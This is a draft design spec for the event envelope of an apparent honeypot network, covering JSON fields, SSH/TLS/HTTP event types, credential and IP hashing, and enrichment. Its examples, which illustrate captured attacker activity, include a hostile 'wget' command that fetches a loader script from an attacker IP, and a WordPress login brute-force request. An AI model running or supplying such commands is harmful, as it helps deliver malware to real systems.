# BoarNet Event Envelope — v1

Status: **draft**
Owner: BoarNet
Last updated: 2026-04-17

## What this is

One JSON shape carries every event a BoarNet sensor emits — SSH session, TLS handshake, dropped payload, HTTP request, heartbeat. The envelope is the contract between the **sensor agent** (producer) and the **ingestion service** (consumer). Everything downstream — normalization, rollup, query API, alert engine — reads from this shape.

There is exactly one envelope. New event types are added by expanding the `event_type` enum and adding a new `raw` variant, never by adding new envelope fields.

## Top-level shape

```json
{
  "envelope_version": 1,
  "event_id": "01HKQAE6VCNPT7BCP0WQG0P3ZB",
  "event_type": "tls.clienthello",
  "ts": "2026-04-18T01:59:33.128Z",
  "sensor": {
    "id": "mesh-xyz-42",
    "fleet": "mesh",
    "agent_version": "0.3.1"
  },
  "src": {
    "ip": "185.63.253.12",
    "ip_hash": "hmac-sha256:6f8a2b3e4c1d0...",
    "port": 52341
  },
  "dst": {
    "port": 443,
    "proto": "tcp"
  },
  "fingerprints": {
    "ja3": "771,4865-4867-...,0-11-10-...,29-23-24,0",
    "ja3_hash": "e7d705a3286e19ea42f587b344ee6865",
    "ja4": "t13d1517h2_8daaf6152771_b0da82dd1658",
    "ssh": null
  },
  "raw": { /* event_type-specific shape — see below */ },
  "tags": ["tls", "high-entropy-sni"],
  "encryption_hints": {
    "sensor_encrypted_fields": [],
    "pepper_key_id": "pepper-2026q2"
  }
}
```

### Field reference

| Field | Type | Required | Notes |
|---|---|---|---|
| `envelope_version` | `int` | yes | Starts at `1`. Bumped only for breaking changes. |
| `event_id` | `ulid` | yes | Client-generated ULID. Provides ordering and dedup. |
| `event_type` | `string` | yes | One of the enumerated values below. |
| `ts` | `RFC3339` | yes | When the event happened on the sensor, UTC, with millisecond precision. |
| `sensor.id` | `string` | yes | Sensor's registered ID (e.g. `mesh-xyz-42`, `core-ldn-01`). |
| `sensor.fleet` | `enum` | yes | `core` or `mesh`. |
| `sensor.agent_version` | `semver` | yes | For forward/backward compat debugging. |
| `src` | `object` | yes | Source (the attacker). Always present. |
| `src.ip` | `string` | yes | IPv4 or IPv6. |
| `src.ip_hash` | `string` | yes | `hmac-sha256:<hex>` — HMAC of `src.ip` with the sensor's per-pepper secret. Lets us query by IP without indexing raw IPs, and obscures IPs in any envelope that leaks before TLS terminates. See [Sensor-side cryptography](#sensor-side-cryptography). |
| `src.port` | `int` | yes | 1–65535. |
| `dst.port` | `int` | yes | The honeypot port that received the connection. |
| `dst.proto` | `enum` | yes | `tcp`, `udp`. |
| `fingerprints` | `object` | yes | May have all-null fields if no fingerprint applies (e.g. ICMP). Fields explicitly present as `null` rather than omitted. |
| `raw` | `object` | yes | Event-type-specific. |
| `tags` | `string[]` | optional | Agent-side hints. Server may add more during enrichment. |
| `encryption_hints` | `object` | yes | Tells ingest which fields the agent already encrypted/hashed, and which pepper generation is in use. See [Sensor-side cryptography](#sensor-side-cryptography). |
| `encryption_hints.sensor_encrypted_fields` | `string[]` | yes | Dot-paths of fields the agent encrypted client-side (e.g. `["raw.body_excerpt"]`). Empty array is valid. |
| `encryption_hints.pepper_key_id` | `string` | yes | Which HMAC pepper generation produced `src.ip_hash` and any other HMACs. |

### Things the envelope does NOT contain

Deliberate omissions — these are added server-side during enrichment, not by the sensor:

- `country`, `city`, `region` — resolved from `src.ip` by the ingest service, not the agent. Agents don't carry GeoIP DBs.
- `asn`, `asn_name` — same.
- `cluster_id`, `cluster_name` — assigned by the rollup job.
- `confidence` — computed by the scoring job.
- `recommended_action` — derived.

Keeping these out of the agent keeps sensors dumb, swap-able, and small.

## Event types

Eight variants at v1. Each is documented with its `raw` shape, example, and notes on when it fires.

### `ssh.session.open`

Fires when an SSH connection reaches the banner exchange. One per incoming session.

```json
"raw": {
  "client_banner": "SSH-2.0-libssh_0.9.6",
  "kex": "curve25519-sha256",
  "cipher": "aes128-ctr",
  "mac": "hmac-sha2-256",
  "compression": "none",
  "client_version": "libssh_0.9.6"
}
```

`fingerprints.ssh` is the HASSH-style algorithm fingerprint hash.

### `ssh.auth.attempt`

Every authentication attempt. Expect multiple per `ssh.session.open` during brute-force.

```json
"raw": {
  "session_id": "ssh_01HKQ...",
  "method": "password" | "publickey" | "none" | "keyboard-interactive",
  "username": "root",
  "credential_hint": "sha256:8c5e4a2b9f..."
}
```

**Credentials are always hashed at the sensor.** `credential_hint` is `sha256:<hex>` of the attempted password (or serialized public-key fingerprint for `publickey` auth). Ingest rejects envelopes where this field is plaintext. This protects against a compromised sensor leaking reusable passwords — an attacker whose password shows up in a breach corpus still isn't learnable from our pipeline.

Username remains plaintext: usernames are not reusable credentials and are essential for cluster attribution.

### `ssh.cmd.exec`

Executed command in a session (only emitted by the SSH honeypot's medium-interaction mode, or by Cowrie in companion mode).

```json
"raw": {
  "session_id": "ssh_01HKQ...",
  "command": "wget http://185.63.253.12/loader.sh",
  "pid": 1432,
  "cwd": "/tmp",
  "exit_code": 0
}
```

### `tls.clienthello`

Fires on every TLS ClientHello received on any listening TLS port, regardless of whether a full handshake completes.

```json
"raw": {
  "tls_version": "0x0303",
  "ciphersuites": ["0x1301", "0x1303", ...],
  "extensions": [0, 10, 11, 13, 16, ...],
  "alpn": ["h2", "http/1.1"],
  "sni": "api.boarnet.local",
  "supported_groups": ["x25519", "secp256r1"]
}
```

`fingerprints.ja3` / `ja3_hash` / `ja4` are all populated by the agent locally.

### `http.request`

HTTP/HTTPS request received by the web honeypot.

```json
"raw": {
  "method": "POST",
  "path": "/wp-login.php",
  "http_version": "1.1",
  "host": "192.0.2.4",
  "user_agent": "Mozilla/5.0 (compatible; Nmap...)",
  "headers_sampled": {
    "accept": "*/*",
    "content-type": "application/x-www-form-urlencoded"
  },
  "body_size": 203,
  "body_sha256": "sha256:...",
  "body_excerpt": "log=admin&pwd=..."
}
```

`body_excerpt` is capped at 512 bytes and never includes file uploads.

### `payload.dropped`

An attacker delivered a file (shell script, ELF, malware sample).

```json
"raw": {
  "session_id": "ssh_01HKQ...",
  "source_command": "wget http://185.63.253.12/loader.sh",
  "filename": "loader.sh",
  "size_bytes": 3241,
  "sha256": "7b9c1f...e2a3",
  "storage_url": "s3://boarnet-samples/7b/9c/7b9c1f...e2a3"
}
```

The sample itself is never in the envelope. Agents upload to object storage out-of-band and reference by sha256 + storage URL. Samples are quarantined, not executed by us.

### `scan.probe`

Short-lived connection that closed before meaningful interaction. Useful for counting background noise without carrying heavy payloads.

```json
"raw": {
  "duration_ms": 42,
  "bytes_in": 0,
  "bytes_out": 0,
  "rst_sent": true
}
```

### `sensor.heartbeat`

Agent → ingest every 60 s. Not a threat event but carried through the same pipeline for operational visibility.

```json
"raw": {
  "uptime_seconds": 864923,
  "events_buffered": 0,
  "events_sent_total": 2418393,
  "local_time_skew_ms": -3,
  "cpu_percent": 0.4,
  "rss_mb": 28
}
```

## Sensor-side cryptography

The agent performs three cryptographic operations before emitting an envelope.

### 1. HMAC pepper (for IP and other indexed identifiers)

At enrollment, the agent receives a **pepper** — a 32-byte random secret, identified by `pepper_key_id` (e.g. `pepper-2026q2`). Each envelope field that needs to be queryable-but-not-directly-leakable is HMAC-SHA256'd with the pepper:

```
src.ip_hash = "hmac-sha256:" + hex(HMAC-SHA256(pepper, src.ip_normalized))
```

Normalization: IPv4 in dotted-quad, IPv6 in compressed lowercase. The agent's job is to hash; the ingest verifies by recomputing over the claimed `src.ip`. If they mismatch, the envelope is rejected (a compromised sensor can't poison records by lying about which IP maps to which HMAC).

Peppers rotate **annually** at enrollment renewal; both the current and previous generation are valid during a 30-day overlap. `pepper_key_id` lets ingest route to the right verifier.

### 2. SHA-256 credential hashing

Covered above under `ssh.auth.attempt`. Mandatory, not optional.

### 3. Field-level encryption (future — not v1)

The `encryption_hints.sensor_encrypted_fields` array is reserved for envelope fields the agent encrypts with a per-sensor key before emission (for PII in sampled payloads, for example). v1 agents emit `[]` and defer that work to ingest-side envelope encryption.

### Local at-rest protection

Separately from the envelope, the agent's local event buffer (SQLite) is encrypted with a per-install key stored in the OS keystore (DPAPI on Windows, Keychain on macOS, libsecret on Linux). A volunteer whose device is stolen does not leak buffered events or their mTLS private key.

## Fingerprint conventions

- `ja3` — canonical JA3 string, unchecked
- `ja3_hash` — MD5 of `ja3` for indexing
- `ja4` — `foxio-llc/ja4` canonical representation (e.g. `t13d1517h2_8daaf6152771_b0da82dd1658`)
- `ssh` — HASSH hash of the algorithm negotiation (matches the upstream HASSH format)

Every field is `null` or present — never omitted, so consumers don't have to handle two shapes.

## Enrichment (added by ingest, not agent)

After validation, the ingest service adds an `enrichment` block **alongside** the envelope body, producing the stored shape:

```json
{
  "envelope": { /* unchanged */ },
  "enrichment": {
    "received_at": "2026-04-18T01:59:33.471Z",
    "src_geo": { "country": "NL", "region": "North Holland", "city": null },
    "src_asn": { "number": 14001, "name": "CHOOPA-LLC" },
    "tls_ja4_family": "t13d1517h2_*",
    "normalizations": ["credential_hint_redacted"]
  }
}
```

Storage and query APIs read `enrichment` alongside `envelope`.

## Versioning

- **Envelope field additions** that don't change semantics do not bump the version.
- **Breaking changes** (field type changes, removed required fields, changed event-type semantics) bump `envelope_version` to `2` and require dual-write support in ingest for one overlap window.
- **New event types** are additive, no version bump. Agents emit only what they know; ingest routes unknown types to `events_raw` for later processing.

## Sample envelope — full, realistic

```json
{
  "envelope_version": 1,
  "event_id": "01HKQAE6VCNPT7BCP0WQG0P3ZB",
  "event_type": "ssh.auth.attempt",
  "ts": "2026-04-18T01:59:33.128Z",
  "sensor": {
    "id": "mesh-xyz-42",
    "fleet": "mesh",
    "agent_version": "0.3.1"
  },
  "src": {
    "ip": "185.63.253.12",
    "ip_hash": "hmac-sha256:6f8a2b3e4c1d0a9f8e7d6c5b4a39281706f5e4d3",
    "port": 52341
  },
  "dst": { "port": 2222, "proto": "tcp" },
  "fingerprints": {
    "ja3": null,
    "ja3_hash": null,
    "ja4": null,
    "ssh": "hassh:a2e5b..."
  },
  "raw": {
    "session_id": "ssh_01HKQAE6VCNPT7BC",
    "method": "password",
    "username": "root",
    "credential_hint": "sha256:8c5e4a2b9f..."
  },
  "tags": ["ssh", "bruteforce-candidate"],
  "encryption_hints": {
    "sensor_encrypted_fields": [],
    "pepper_key_id": "pepper-2026q2"
  }
}
```

## Open questions (not blocking v1)

- Do we support signed envelopes (sensor-signed JWS) for tamper detection, or is mTLS transport sufficient? — **default v1: mTLS only**.
- Should heartbeats be a different transport (smaller, dedicated) to reduce ingest overhead at scale? — **defer to v2**.
- Should we commit to PII redaction at the agent for EU compliance, or treat that as an ingest-side concern? — **v1 policy: agent hashes credentials and IPs, ingest handles everything else**.
- When does field-level sensor encryption (beyond hashing) actually earn its complexity? — **v1 ships `sensor_encrypted_fields: []`. Revisit when we start capturing larger sampled payloads (HTTP bodies, form submissions).**
